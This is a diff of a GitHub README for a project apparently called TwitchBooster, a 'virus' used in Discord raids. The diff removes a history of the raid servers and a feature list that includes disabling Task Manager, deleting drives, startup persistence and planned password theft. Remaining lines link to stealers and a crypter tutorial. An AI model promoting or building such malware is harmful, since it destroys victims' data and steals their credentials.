@@ -26,74 +26,7 @@
 This free script makes you able to encrypt, and decrypt a file with a certain key.
 So, any other key will not work fort this script
 
-<details>
-<summary>
-Protagonists
-</summary> <br />
-  
-### Twitch Game
-   Name of several discord servers dedicated to raids. They follow one another over time.
 
-### Damben
-   Founder of the first Twitch Game in February 2016. At the time, Twitch Booster didn't yet exist, and forumers were raiding on Tinychat and making extensive use of the screamer cactus created in 2012.
-
-### Sirop
-   Founder of the second Twitch Game discord in July 2016. The Damben server flops and empties of members who go to the second server.
-
-### Jewstice
-   Participates in the founding of the new Twitch Game. He becomes one of the main protagonists of the period, laying the foundations for the Twitch Booster virus, which he codes clumsily and rudimentarily. He led numerous raids and started the War of Discords in March 2017.
-
-### Sneus
-   Founder of Risiraid in March 2017, a new raid server. He greatly improves the virus with Gin and makes it presentable which increases the power of raids tenfold. He created a new SneusRaid server following a disagreement with Gin shortly after an IRL with him and Pike.
-
-### Gin / Sejo
-   Risiraid Admin
-
-### Pike
-   Risiraid admin
-
-### Fripinside
-   Leaves Risiraid and creates his own server ExoodArmy more open to newfags in order to spread the word about the virus. Particularly young and immature.
-</details>
-
-<details>
-<summary>
-Features
-</summary> <br />
-    
-> 1. Spam disk open and close
-    
-> 2. Disable task Manager
-    
-> 3. Spam enter
-    
-> 4. Hide taskbar
-    
-> 5. melter.exe (not a virus, just do alt+f4 and your screen will *unmelt*)
-    
-> 6. Spam errors
-    
-> 7. Voice Message
-    
-> 8. Has a GUI (it does nothing, it's just to mislead the person) : 
-    <img src=https://i.imgur.com/mmwfCwY.png>
-
-> 9. Spam the leds on the keyboards (The caps lock, the scroll lock and the nums lock.)
-	
-> 10. Change wallpaper (you can change it, just take another photo and name it risi.bmp)
-
-> 11. Delete C: , D: , E: , etc...
-	
-> 12. Auto inject in A LOT of folder if the person suceed to stop the virus (it will run at the start of the pc !)
-
-> 13. Steal the passwords, the information and a lot more ! (really soon)
-
-> **Note**
-> : I am adding more don't worry !
-	
-> I will add something like stealers and stuff like that ! Maybe some other virus, like NoEscape.exe, but maybe i shouldn't..
-    
-</details>
    
 
 <details>
@@ -120,7 +53,7 @@ All links are [here](https://github.com/KamiHateOmg/TwitchBooster#stealers-and-o
 * [Crypter tuto](https://www.youtube.com/watch?v=Ldb8gbY7BQE)
 
 	
-	</details>
+</details>
 	
 
 
@@ -142,7 +75,7 @@ Pre-requisites
 - [Python 3.9 or above](https://www.python.org/downloads) OR Windows OS
 
 
-
+<\details>
 	
 	
 ### License
@@ -151,7 +84,7 @@ Pre-requisites
 
 ### Contact
 
-You can reach me on [Discord notkamihate](https://discord.gg/XGS5ajTXbJ)
+You can reach me on [Discord : arnaqueurs](https://discord.gg/XGS5ajTXbJ)
 
 
 #### Thank y'all, and don't forget, made by Kami ! ツ
